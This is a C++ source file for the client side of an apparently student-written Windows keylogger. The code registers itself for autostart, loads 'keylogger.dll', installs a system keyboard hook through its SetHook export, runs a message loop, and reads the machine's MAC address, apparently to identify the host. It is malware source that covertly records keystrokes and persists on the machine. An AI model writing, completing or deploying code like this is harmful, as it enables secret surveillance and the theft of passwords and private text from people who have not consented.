#include "ClientLogger.hpp"

ClientLogger::ClientLogger()
	: _quit(false), _hDll(NULL)
{

}

ClientLogger::~ClientLogger()
{

}

std::string	ClientLogger::getAddressMAC() const
{
	PIP_ADAPTER_INFO	adapterInfo;
	ULONG				size;

	size = sizeof(IP_ADAPTER_INFO);
	adapterInfo = new IP_ADAPTER_INFO;
	if (GetAdaptersInfo(adapterInfo, &size) != NO_ERROR)
	{
		delete adapterInfo;
	}
	else if (GetAdaptersInfo(adapterInfo, &size) == NO_ERROR)
	{
		std::stringstream ss("");

		ss << std::setfill('0') << std::setw(2);
		ss << std::hex << static_cast<int>(adapterInfo->Address[0]) << ":";
		ss << std::hex << static_cast<int>(adapterInfo->Address[1]) << ":";
		ss << std::hex << static_cast<int>(adapterInfo->Address[2]) << ":";
		ss << std::hex << static_cast<int>(adapterInfo->Address[3]) << ":";
		ss << std::hex << static_cast<int>(adapterInfo->Address[4]) << ":";
		ss << std::hex << static_cast<int>(adapterInfo->Address[5]);
		delete adapterInfo;
		return (ss.str());
	}
	return ("");
}

bool	ClientLogger::init(const char *name)
{
	AutoStart start(name);
	hook ptrHook = NULL;

	SetLastError(0);

	start.verifyPath();
	start.verifyRegister();

	if ((_hDll = LoadLibrary("keylogger.dll")) == NULL
		|| (ptrHook = (hook)GetProcAddress(_hDll, "SetHook")) == NULL)
		return (false);

	_disp = std::shared_ptr<Dispatcher>(new Dispatcher("q"));
	//getAddressMAC

	if (ptrHook(_disp) == false)
		return (false);
	return (true);
}

void	ClientLogger::run()
{
	MSG msg;

	while (GetMessage(&msg, NULL, 0, 0))
	{
		if (msg.message == WM_QUIT || msg.message == WM_DESTROY || msg.message == WM_CLOSE)
				break;
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	if (!unset())
	{
		std::cerr << GetLastError() << std::endl;
		Sleep(1000);
	}
}

bool	ClientLogger::unset()
{
	pFunc ptrFunc = NULL;

	if ((ptrFunc = (pFunc)GetProcAddress(_hDll, "RemoveHook")) == NULL)
	{
		std::cerr << GetLastError() << std::endl;
		return (false);
	}
	ptrFunc();
	FreeLibrary(_hDll);
	return (true);
}